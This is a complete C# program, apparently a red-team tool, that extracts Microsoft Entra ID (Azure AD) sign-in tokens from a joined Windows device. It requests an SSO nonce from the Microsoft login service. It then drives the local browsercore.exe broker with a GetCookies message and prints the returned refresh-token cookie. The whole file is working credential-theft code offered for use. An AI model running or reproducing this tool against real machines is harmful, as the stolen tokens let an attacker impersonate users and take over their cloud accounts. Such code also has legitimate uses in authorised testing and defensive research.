using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using Newtonsoft.Json;
using System.Threading.Tasks;

namespace WOAHtoken
{
    class Program
    {
        public class jsonResponse
        {
            public string Nonce { get; set; }
        }

        public static async Task<string> getNonce(string tenantID)
        {
            string url = "https://login.microsoftonline.com/" + tenantID + "/oauth2/token";
            HttpClient client = new HttpClient();
            var reqData = new Dictionary<string, string>
            {
                {"grant_type", "srv_challenge" }
            };
            var reqBody = new FormUrlEncodedContent(reqData);

            var response = await client.PostAsync(url, reqBody);

            var resBody = await response.Content.ReadAsStringAsync();

            jsonResponse j = JsonConvert.DeserializeObject<jsonResponse>(resBody);
            Console.WriteLine("[+] Received nonce: " + j.Nonce);
            return j.Nonce;
        }
        static void Main(string[] args)
        {
            string tenantID, nonce;
            if (args.Length > 0)
            {
                tenantID = args[0];
            }
            else
            {
                tenantID = "00000000-0000-0000-0000-000000000000";
            }

            Task<string> nonceTask = getNonce(tenantID);
            nonce = nonceTask.Result;

            // possible locations of browsercore.exe
            string[] bcLocations = {
                @"C:\Program Files\Windows Security\BrowserCore\browsercore.exe",
                @"C:\Windows\BrowserCore\browsercore.exe"
             };
            string bcoreLocation = null;
            string bcoreJson;

            Process bcoreProc;

            foreach (string l in bcLocations)
            {
                if (File.Exists(l))
                {
                    bcoreLocation = l;
                    break;
                }
            }

            if (bcoreLocation == null)
            {
                Console.WriteLine("[!] Could not find browsercore.exe, exiting...");
                return;
            }

            bcoreProc = new Process();
            bcoreProc.StartInfo.UseShellExecute = false;
            bcoreProc.StartInfo.FileName = bcoreLocation;
            bcoreProc.StartInfo.RedirectStandardInput = true;
            bcoreProc.StartInfo.RedirectStandardOutput = true;

            // original uri: https://login.microsoftonline.com/common/oauth2/authorize
            bcoreJson = "{\"method\":\"GetCookies\",\"uri\":\"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=" +
                nonce + "\",\"sender\":\"https://login.microsoftonline.com\"}";

            bcoreProc.Start();

            StreamWriter sw = bcoreProc.StandardInput;

            var dataLength = bcoreJson.Length;
            byte[] bytes = BitConverter.GetBytes(dataLength);
            sw.BaseStream.Write(bytes, 0, 4);
            sw.Write(bcoreJson);
            sw.Close();

            bool failed = false;
            string respContent = "";
            while (!bcoreProc.StandardOutput.EndOfStream)
            {
                respContent += bcoreProc.StandardOutput.ReadLine();
                //Console.WriteLine(respContent);
                if (respContent.Contains("\"status\": \"Fail\""))
                {
                    failed = true;
                }
            }

            bcoreProc.WaitForExit();
            if (failed)
            {
                Console.WriteLine("[!] Woah (in sad Keanu voice), could not get a token");
                Console.WriteLine("[!] Make sure you are on a device that is Entra/AzureAD-joined");
            }
            else
            {
                Console.WriteLine("[+] WOAH! (in excited Keanu voice) You have a token!");
                Console.WriteLine(respContent);
            }

        }
    }
}
